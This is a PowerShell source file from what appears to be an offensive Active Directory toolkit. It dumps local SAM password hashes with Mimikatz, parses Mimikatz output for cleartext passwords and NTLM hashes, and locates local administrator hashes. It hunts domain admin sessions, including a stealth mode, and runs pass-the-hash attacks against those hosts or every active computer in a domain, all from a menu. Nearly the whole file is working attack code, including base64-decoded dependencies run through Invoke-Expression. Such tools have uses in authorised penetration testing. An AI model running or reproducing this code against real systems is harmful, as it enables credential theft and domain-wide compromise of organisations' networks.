function Get-LocalUserHash()
{
<#
.SYNOPSIS

This function converts the "fulltext"-output from mimikatz "lsadump::sam" into a custom powershell object.

Author: Christoph Falta (@cfalta)
Required Dependencies: Invoke-Mimikatz (from the Powersploit Suite)

.DESCRIPTION

This function converts the "fulltext"-output from mimikatz "lsadump::sam" into a custom powershell object.

.EXAMPLE

Get-LocalUserHash

Description
-----------

Simpley run the command. All local user hashes will be returned as PSObject.

.LINK

https://github.com/cfalta/ADT

#>
    #Resolve external dependencies
    $Dependencies = @("Invoke-Mimikatz")

    foreach($D in $Dependencies)
    {
        $Encoded = Get-ExternalDependency($D)
        [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($Encoded)) | Invoke-Expression
    }

    #Get the local user accounts and hashes via Mimikatz
    $MimikatzOutput = Invoke-Mimikatz -Command "privilege::debug token::elevate lsadump::sam exit"

    $SAMDump = $MimikatzOutput | Select-String -Pattern "(?s)(SAMKey).*(mimikatz\(powershell\))" -AllMatches
    $SAMDump = $SAMDump.Matches[0].Value.Split("`n")

    $LocalHashes = @()
    $Identifier = 0

    #Create an array of custom psobjects
    foreach($Entry in $SAMDump)
    {
        if($Entry.Contains("User"))
        {
            $Username = ($Entry.Substring($Entry.IndexOf(":")+1)).Trim()
            $NTLM = $SAMDump[$Identifier+2]
            $NTLM = ($NTLM.Substring($NTLM.IndexOf(":")+1)).Trim()
            $ID = $SAMDump[$Identifier-1]
            $ID = ($ID.Substring($ID.IndexOf("(")+1)).TrimEnd(")")

            if($NTLM)
            {
                $LocalHash = New-Object -TypeName PSObject
                $LocalHash | Add-Member -MemberType NoteProperty -Name Username -Value $Username
                $LocalHash | Add-Member -MemberType NoteProperty -Name Domain -Value "LOCAL"
                $LocalHash | Add-Member -MemberType NoteProperty -Name ID -Value $ID
                $LocalHash | Add-Member -MemberType NoteProperty -Name NTLM -Value $NTLM

                $LocalHashes += $LocalHash
            }

        }

        $Identifier++
    }

    return($LocalHashes)
}

function Convert-MimikatzToPSObject {
<#
.SYNOPSIS

This function converts the "fulltext"-output from mimikatz into a custom powershell object.

Original Author: NetSPI / Will Schroeder
Customized by: Christoph Falta (@cfalta)

The search strings and the matching function have been copied from:
Parsing Function by NetSPI: https://raw.githubusercontent.com/NetSPI/PowerShell/master/Invoke-MassMimikatz-PsRemoting.psm1
Original Function by Will Schroeder: https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1

.DESCRIPTION

Convert-MimikatzToPSObject parses the default output from mimikatz and returns the credentials in a nicely formated table.

.PARAMETER MimikatzOutput

The outout from mimikatz as a single string value.

.EXAMPLE

$MimikatzOutput | Convert-MimikatzToPSObject

Description
-----------

The mimikatz output stored in the variable $MimikatzOutput is passed to Convert-MimikatzToPSObject via the pipeline and a custom powershell object will be returned.

.LINK

https://github.com/cfalta/ADT

#>

[CmdletBinding()] 
Param(
    [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
    [ValidateNotNullorEmpty()]
    [String]
    $MimikatzOutput
)

$CredentialList = @()

#Extract hostname

$Output = $MimikatzOutput | Select-String -Pattern "(Username :).*\$"
$RetrievedFrom = ($Output.Matches[0].Value.Substring($Output.Matches[0].Value.IndexOf(":")+1)).Trim()

#These regular expressions have been copied from NetSPI / https://raw.githubusercontent.com/NetSPI/PowerShell/master/Invoke-MassMimikatz-PsRemoting.psm1
$SearchStrings = @()
$SearchStrings += "(?s)(?<=msv :).*?(?=tspkg :)"
$SearchStrings += "(?s)(?<=tspkg :).*?(?=wdigest :)"
$SearchStrings += "(?s)(?<=wdigest :).*?(?=kerberos :)"
$SearchStrings += "(?s)(?<=kerberos :).*?(?=ssp :)"

foreach($SearchString in $SearchStrings)
{
    $Output = $MimikatzOutput | Select-String -Pattern $SearchString -AllMatches | %{$_.matches} | %{$_.value}

    if($Output)
    {
        foreach($Match in $Output)
	    {
            $Credential = New-Object -TypeName PSObject

            #This parsing loop has been copied from NetSPI / https://raw.githubusercontent.com/NetSPI/PowerShell/master/Invoke-MassMimikatz-PsRemoting.psm1
            if($Match.Contains("Domain"))
		    {
                $Lines = $Match.split("`n")
			
                foreach($Line in $Lines)
			    {
				    if ($Line.Contains("Username")){
					    $Username = $Line.split(":")[1].trim()
				    }
				    elseif ($Line.Contains("Domain")){
					    $Domain = $Line.split(":")[1].trim()
				    }
				    elseif ($Line.Contains("NTLM")){
					    $Pwtype = "NTLM Hash"
					    $Password = $Line.split(":")[1].trim()
				    }
				    elseif ($Line.Contains("Password")){
					    $Pwtype = "Cleartext"
					    $Password = $Line.split(":")[1].trim()
				    }
			    }
			    if (($Password -and ($Password -ne "(null)")) -and ($Username -notlike "*$"))
			    {                    
                    $Credential | Add-Member -MemberType NoteProperty -Name "PasswordType" -Value $Pwtype
                    $Credential | Add-Member -MemberType NoteProperty -Name "Domain" -Value $Domain
                    $Credential | Add-Member -MemberType NoteProperty -Name "RetrievedFrom" -Value $RetrievedFrom
                    $Credential | Add-Member -MemberType NoteProperty -Name "Username" -Value $Username
                    $Credential | Add-Member -MemberType NoteProperty -Name "Password" -Value $Password

                    $CredentialList += $Credential
			    }
            }
        }
    }
}

return($CredentialList)
}

function Invoke-AutoPilot
{
<#
.SYNOPSIS

Invoke-AutoPilot is a wrapper script for other ADT functions, which is meant to provide an easy to use interface for credential attacks.

Author: Christoph Falta (@cfalta)
Required Dependencies: Invoke-Userhunter (from the Powersploit Suite)

.DESCRIPTION

Invoke-AutoPilot offers the following functions:

-) Dump local user hashes
-) Find all active domain admin sessions and try to dump their credentials via PTH
-) Find all active domain admin sessions and try to dump their credentials via PTH (StealthMode)
-) Try to dump ALL credentials from ALL active computers in the domain (in other words: running a Pass-the-Hash attack against all computers in the domain)

If User, Domain and Hash parameters are not supplied, the script automatically identifies local admin accounts on the executing machine and tries to use these credentials for Pass-the-Hash.

.PARAMETER Target

The attack to run. Possible choices are:

-) LocalHash - dump local password hashes and print to stdout
-) DomainAdmin - find all active domain admin sessions and run a pass-the-hash attack against these systems
-) DomainAdminStealth - find all active domain admin sessions in stealth mode and run a pass-the-hash attack against these systems
-) AnyCredential - run a pass-the-hash attack against ALL active computers in the domain

.PARAMETER User

The Username to use for the pass-the-hash attack

.PARAMETER Domain

The Domain to use for the pass-the-hash attack

.PARAMETER Hash

The Hash to use for the pass-the-hash attack

.EXAMPLE

Invoke-AutoPilot

Description
-----------

Without any parameters, a text-based menu will let the user choose the target.

.EXAMPLE

Invoke-AutoPilot -Target AnyCredential

Description
-----------

Run a pass-the-hash attack against all computers in the domain. Automatically extract the credentials for the attack from the local machine.


.LINK

https://github.com/cfalta/ADT

#>
    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory=$False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Target,

        [Parameter(Position = 1, Mandatory=$False)]
        [ValidateNotNullorEmpty()]
        [String]
        $User,

        [Parameter(Position = 2, Mandatory=$False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Domain,

        [Parameter(Position = 3, Mandatory=$False)]
        [ValidateNotNullorEmpty()]
        [String]
        $Hash
    )


#Set default values for control variables

$ScriptRequirements = $True
$global:UserInput = $null
#Resolve external dependencies

$Dependencies = @("PowerView")

foreach($D in $Dependencies)
{
    $Encoded = Get-ExternalDependency($D)
    [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($Encoded)) | Invoke-Expression
}

#This function creates an interactive text menu so the user can choose the type of attack
function Invoke-Menu()
{
    #Write a custom ASCII-art header to std-out
    Write-FancyHeader

    $MenuLevel0 = 0
    while(($MenuLevel0 -lt 1) -OR ($MenuLevel0 -gt 5))
    {
        Write-Output ""
        Write-Output "What do you want to do?"
        Write-Output ""
        Write-Output "[1] Dump local user hashes"
        Write-Output "[2] Find all active domain admin sessions and try to dump their credentials via PTH"
        Write-Output "[3] Find all active domain admin sessions and try to dump their credentials via PTH (StealthMode)"
        Write-Output "[4] Try to dump ALL credentials from ALL active computers in the domain (Warning: this might take some time)"
        Write-Output "[5] Quit"
        $MenuLevel0 = Read-Host

        #Set a global variable depending on the user input. This variable will be evaluated later in the script.
        Switch($MenuLevel0)
        {
            1 { $global:UserInput = "LocalHash" }
            2 { $global:UserInput = "DomainAdmin" }
            3 { $global:UserInput = "DomainAdminStealth" }
            4 { $global:UserInput = "AnyCredential" }
        }
    }
}

# This function identifies one or more accounts suitable for a Pass-the-Hash attack by using the followind order:
# 
# -) If the default local Administrator account (SID 500) is active, then this account will be used
# -) Otherwise all local accounts which are active and member of the local Administrator group will be added to custom psobject and returned
#
function Find-PassableHash()
{
    $PassableHash = @()

    #The local Administrator groups are identified by name, which is dependant on the installed language. At the moment, German and English are supported.
    $LocalAdminGroupNames = "Administrators","Administratoren"
    
    $LocalComputer = $env:COMPUTERNAME
    
    #Extract password hashes of local user
    $LocalHashes = Get-LocalUserHash

    #Query all local users via WMI
    $LocalUser = Get-WmiObject -Class Win32_UserAccount -Filter 'LocalAccount = "True"'
    $TheLocalAdmin = $LocalUser | ? {$_.SID -like "*500"}

    #Check if the default Administrator account is active
    if($TheLocalAdmin.Disabled)
    {
        #Iterate through all user / groupname combinations and identify local administrator accounts
        foreach($GroupName in $LocalAdminGroupNames)
        {
            #Construct WMI filter and run query
            $FilterPart1 = 'GroupComponent="'
            $FilterPart2 = "Win32_Group.Domain='$LocalComputer',Name='$GroupName'"
            $WMIFilter = $FilterPart1 + $FilterPart2 + '"'
            $LocalGroupUser = Get-WmiObject -Class Win32_Groupuser -Filter $WMIFilter
            

            if($LocalGroupUser)
            {
                #For each local user account which is not disabled
                foreach($LU in ($LocalUser | ? {-NOT $_.Disabled}))
                {
                    #Check if this user is also a member of the local Administrators group
                    foreach($LGU in $LocalGroupUser)
                    {
                        $SearchFilter = '*Name="' + $LU.Name + '"'
                        if($LGU.partcomponent -like $SearchFilter)
                        {
                            #Add the user and the corresponding password hash to the output object
                            $PassableHash += ($LocalHashes | ? { $_.Username -eq $LU.Name})
                            break
                        }
                    }
                }
            }
        }
    }
    else
    {
        $PassableHash = $LocalHashes | ? {$_.ID -eq 500}
    }

    return($PassableHash)

}

#This function checks if User,Domain and Hash were passed as parameters. If not, the credentials of local accounts are automatically extracted via Find-PassableHash
function Resolve-Credentials()
{
    if($User -and $Domain -and $Hash)
    {
        $Credential = New-Object -TypeName PSObject
        $Credential | Add-Member -MemberType NoteProperty -Name Username -Value $User
        $Credential | Add-Member -MemberType NoteProperty -Name Domain -Value $Domain
        $Credential | Add-Member -MemberType NoteProperty -Name NTLM -Value $Hash   
    }
    else
    {
        $Credential = Find-PassableHash
    }

    return($Credential)
}

#This function creates a list of target computers based on the attack mode choosen by the user
function Resolve-Targets([string]$Mode)
{
    $TargetHostList = @()

    switch($Mode)
    {
        #The Invoke-UserHunter script from the PowerSploit suite is used to identify active admin sessions in the network
        DomainAdmin{ 
    
            $ActiveAdminSessions = Invoke-UserHunter
            $ActiveAdminSessions | % { $TargetHostList += $_.SessionFrom}
    
        }
        #The Invoke-UserHunter script from the PowerSploit suite is used in stealth mode to identify active admin sessions in the network
        DomainAdminStealth{
    
            $ActiveAdminSessions = Invoke-UserHunter -Stealth
            $ActiveAdminSessions | % { $TargetHostList += $_.SessionFrom}
    
        }
        #All active computer accounts are retrieved via the Invoke-Profiler script
        AnyCredential{
    
            $ActiveComputer = Invoke-Profiler -Profile Computer | ? {($_.isDisabled -eq $False) -AND ($_.isInactive -eq $False)}
            $ActiveComputer | % { $TargetHostList += $_.DNSName }
    
        }
    }

    return($TargetHostList)

}

#This function combines all previously defined functions to run the actual attack
function Invoke-Attack()
{

    $TargetHosts = $null

    #Get a list of targets via Resolve-Targets
    $TargetHosts = Resolve-Targets($Target)

    #Get a list of credentials via Resolve-Credentials
    $Credentials = Resolve-Credentials

    #If both credentials and targets are available, run an attack
    if($TargetHosts -and $Credentials)
    {
        $ActiveTargetHosts = @()
        Write-Verbose "Checking which hosts are up"
        foreach($T in $TargetHosts)
        {   
            if((Test-Connection -Count 1 -Quiet -ComputerName $T))
            {
                $ActiveTargetHosts += $T
            }
        }

        Write-Verbose ("Active hosts: " + $ActiveTargetHosts.Count)

        #Format the target list
        $ActiveTargetHosts | % {$TargetList += $_ += ","}
        $TargetList = $TargetList.Trim(",")

        #Foreach credential set, run an attack against all targets using Invoke-CredentialHunter
        foreach($Cred in $Credentials)
        {
            Write-Verbose ("Invoking CredentialHunter on " + ($TargetList | Measure-Object).count + " targets, using credentials of user " + $Cred.Username + "/" + $Cred.NTLM)
            Invoke-CredentialHunter -Target $TargetList -User $Cred.Username -Domain $Cred.Domain -Hash $Cred.NTLM
        }
    }
    else
    {
        Write-Verbose ("Invoke-Attack failed. Resolved targets: " + ($TargetHosts | Measure-Object).count + " Resolved credentials: " + ($Credentials | Measure-Object).count)
    }

}


#The main script executin starts here

#Check if the user has local admin rights
if(-Not (Confirm-LocalAdmin))
{
    Write-Warning "Local Admin rights are needed. Please elevate powershell and try again."
    $ScriptRequirements = $False
}

#If all requirements are met, continue execution
if($ScriptRequirements)
{
    #If the user did not choose an attack mode, show an interactive menu
    if(-Not $Target)
    {
        Invoke-Menu

        if($global:UserInput)
        {
            $Target = $global:UserInput
        }
    }

    #Run attack based on user choice
    switch($Target)
    {
        LocalHash{ Get-LocalUserHash | Format-Table }

        DomainAdmin{ Invoke-Attack }
    
        DomainAdminStealth{ Invoke-Attack }

        AnyCredential{ Invoke-Attack }
    }
}


}
